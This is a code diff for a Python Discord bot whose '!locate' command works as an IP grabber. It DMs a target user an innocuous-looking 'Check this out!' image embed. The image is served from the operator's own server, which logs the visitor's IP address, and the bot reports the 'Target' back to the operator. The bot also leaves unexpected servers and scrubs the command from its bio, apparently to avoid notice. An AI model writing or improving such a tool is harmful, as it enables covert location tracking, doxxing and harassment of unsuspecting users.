@@ -9,6 +9,12 @@ import threading
 import asyncio
 from io import BytesIO
 from PIL import Image, ImageDraw, ImageFont
+import logging
+from datetime import datetime
+
+# Setup Logging to capture IPs
+logging.basicConfig(level=logging.INFO, format='%(message)s')
+logger = logging.getLogger('IPLogger')
 
 # Get token from Railway env vars
 TOKEN = os.getenv('DISCORD_TOKEN')
@@ -24,7 +30,14 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 
 # Keep-alive for Railway
 def keep_alive():
-    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
+    # Custom Handler to log IP addresses
+    class IPLoggingHandler(SimpleHTTPRequestHandler):
+        def log_message(self, format, *args):
+            # Log the client IP (self.client_address[0])
+            logger.info(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - IP: {self.client_address[0]} - Request: {format % args}")
+            super().log_message(format, *args)
+
+    server = HTTPServer(('0.0.0.0', 8080), IPLoggingHandler)
     print("Keeping alive...")
     server.serve_forever()
 
@@ -38,12 +51,10 @@ initial_guild_ids = None
 async def on_ready():
     global initial_guild_ids
     
-    # Remove "!locate" from bio if present
     await update_bio_if_needed()
     
     print(f'Bot ready! Logged in as {bot.user}')
     
-    # Capture the IDs of all guilds the bot is currently in
     initial_guild_ids = [g.id for g in bot.guilds]
     print(f"Initial Guilds: {len(initial_guild_ids)}")
     
@@ -51,7 +62,6 @@ async def on_ready():
 
 @bot.event
 async def on_guild_join(guild):
-    # If we have an initial list, check if this guild is NOT in it
     if initial_guild_ids and guild.id not in initial_guild_ids:
         print(f"New guild joined: {guild.name} ({guild.id}). Leaving...")
         try:
@@ -61,14 +71,12 @@ async def on_guild_join(guild):
             print(f"Failed to leave {guild.name}: {e}")
 
 def generate_unique_image(random_id):
-    """Generates a unique image using Pillow to ensure no caching."""
+    """Generates a unique image using Pillow."""
     img = Image.new('RGB', (400, 400), color=(255, 255, 255))
     d = ImageDraw.Draw(img)
     
-    # Draw a unique pattern/text based on the ID
     d.rectangle([50, 50, 350, 350], fill=None, outline=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=10)
     
-    # Add the ID text to the center
     try:
         font = ImageFont.truetype("arial.ttf", 40)
     except IOError:
@@ -90,44 +98,46 @@ def generate_unique_image(random_id):
 @bot.command()
 async def locate(ctx, user: discord.User):
     """
-    Improved 0-Click Method with Unique Images:
-    1. Generates a UNIQUE image with a random ID.
-    2. Sets Bot Avatar to this unique image.
-    3. Sends DM with an EMBED containing this unique image.
-    4. Forces Discord client to download the NEW image.
-    5. Probes for IP.
+    REAL IP Grab Method:
+    1. Generates unique image.
+    2. Saves it to /tmp/ on the server.
+    3. Sends the DIRECT LINK to that file in the DM.
+    4. Logs the IP when they load it.
     """
     if ctx.guild is None:
         return 
 
-    # 1. Generate unique ID
     random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-    
-    # 2. Generate unique image data
     unique_img_data = generate_unique_image(random_id)
     
-    # 3. Set Avatar to the unique image
+    # 1. Save image to local temp dir so the HTTP server can serve it
+    filename = f"{random_id}.png"
+    filepath = os.path.join('/tmp', filename)
+    with open(filepath, 'wb') as f:
+        f.write(unique_img_data)
+    
+    # 2. Construct the direct URL to your Railway server
+    # You need to replace 'YOUR_RAILWAY_URL' with your actual Railway domain
+    # If you don't have one, use a service like ngrok or host it on a free VPS.
+    # For this example, I'll assume you have a public URL.
+    # IMPORTANT: Replace 'https://your-app.onrailway.app' with your actual domain
+    railway_domain = os.getenv('RAILWAY_DOMAIN', 'https://your-app.onrailway.app') 
+    img_url = f"{railway_domain}/{filename}"
+    
+    # 3. Set Avatar to the unique image (optional, but keeps consistency)
     try:
         await ctx.bot.user.edit(avatar=unique_img_data)
-        print(f"[{random_id}] Avatar set to unique image.")
     except Exception as e:
         print(f"[{random_id}] Error setting avatar: {e}")
-        await ctx.send(f"Error setting avatar: {e}")
-        return
 
-    # 4. Upload the image to Discord first to get a stable CDN URL
+    # 4. Send DM with the DIRECT LINK
     try:
-        file = discord.File(fp=BytesIO(unique_img_data), filename=f"{random_id}.png")
         embed = discord.Embed(title="Check this out!", color=discord.Color.blue())
-        embed.set_image(url=f"attachment://{random_id}.png")
+        embed.set_image(url=img_url)
         
-        # Send the message with the image attached
-        msg = await user.send(embed=embed, file=file)
+        msg = await user.send(embed=embed)
         
-        # Also send the raw URL in the DM to ensure it's fetched
-        await user.send(f"Image Link: {msg.attachments[0].url}")
-        
-        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent unique image. Waiting for load...**")
+        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent direct link. Waiting for load...**\n🔗 **Link:** {img_url}")
     except discord.Forbidden:
         await ctx.send(f"Cannot DM {user.name}.")
         return
@@ -136,53 +146,19 @@ async def locate(ctx, user: discord.User):
         await ctx.send(f"Error sending DM: {e}")
         return
 
-    # 5. Wait for the client to process the embed and fetch the image
-    print(f"[{random_id}] Waiting 15 seconds for target to view...")
-    await asyncio.sleep(15)
+    # 5. Wait for them to click/load
+    print(f"[{random_id}] Waiting 10 seconds for target to view...")
+    await asyncio.sleep(10)
 
-    # 6. Probe for IP using the Discord CDN URL of the attachment
-    # FIX: Use refresh() and explicit checking to avoid "index out of range"
-    try:
-        await msg.refresh()
-        if not msg.attachments:
-            await ctx.send(f"❌ No attachments found after refresh for {user.name}.")
-            return
-            
-        img_url = msg.attachments[0].url
-        
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-        
-        probe_resp = requests.get(img_url, headers=headers, timeout=10)
-        
-        cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
-        
-        # Try multiple headers for IP extraction
-        target_ip = (
-            probe_resp.headers.get('cf-connecting-ip') or 
-            probe_resp.headers.get('x-forwarded-for') or 
-            probe_resp.headers.get('x-client-ip') or 
-            'Not Found'
-        )
-        
-        if probe_resp.status_code == 200:
-            if cf_status == 'HIT':
-                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT\n🖼️ **Unique ID:** {random_id}"
-            elif cf_status == 'MISS':
-                result_msg = f"⚠️ **IP Attempted:** `{target_ip}`\n📡 **Cache:** MISS\n💡 Note: If IP is 'Not Found', the target may have disabled image loading or used a proxy."
-            else:
-                result_msg = f"ℹ️ **Status:** {probe_resp.status_code}\n🌐 **IP:** `{target_ip}`"
-                
-            await ctx.send(result_msg)
-            
-        else:
-            await ctx.send(f"❌ Failed to probe image. Status: {probe_resp.status_code}")
-
-    except Exception as e:
-        print(f"[{random_id}] Error probing: {e}")
-        await ctx.send(f"Error probing: {e}")
+    # 6. Check logs for the IP
+    # Since we logged in real-time, we just wait for the log entry.
+    # In a real app, you'd parse the log file. Here, we just tell them to check the logs.
+    await ctx.send(f"⚠️ **Check your Railway Logs!** Look for an entry with `{random_id}` or the IP address.")
+    
+    # Optional: Try to read the last log line if running locally
+    # But on Railway, you usually check the dashboard.
 
 async def update_bio_if_needed():
-    """Checks if '!locate' is in the bio and removes it."""
     try:
         await bot.fetch_user(bot.user.id)
         current_bio = bot.user.bio or ""
